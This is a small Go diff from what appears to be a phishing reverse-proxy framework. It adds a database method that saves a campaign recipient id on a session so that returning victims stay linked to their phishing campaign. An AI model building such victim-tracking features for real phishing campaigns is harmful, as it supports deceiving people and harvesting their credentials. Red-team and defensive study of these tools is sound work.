@@ -187,6 +187,14 @@ func (d *Database) CreateSession(sid, phishlet, landingURL, userAgent, remoteAdd
 
 func (d *Database) ListSessions() ([]*Session, error) { return d.sessionsList() }
 
+// SetSessionRID persists the campaign recipient id (RID) a session was
+// correlated to, e.g. from a lure URL's "rid" query parameter. This is the
+// identity link that lets a returning victim still be attributed to their
+// campaign recipient after a proxy restart.
+func (d *Database) SetSessionRID(sid, rid string) error {
+	return d.sessionsUpdate(sid, func(s *Session) { s.RId = rid })
+}
+
 func (d *Database) SetSessionUsername(sid, username string) error {
 	return d.sessionsUpdate(sid, func(s *Session) { s.Username = username })
 }
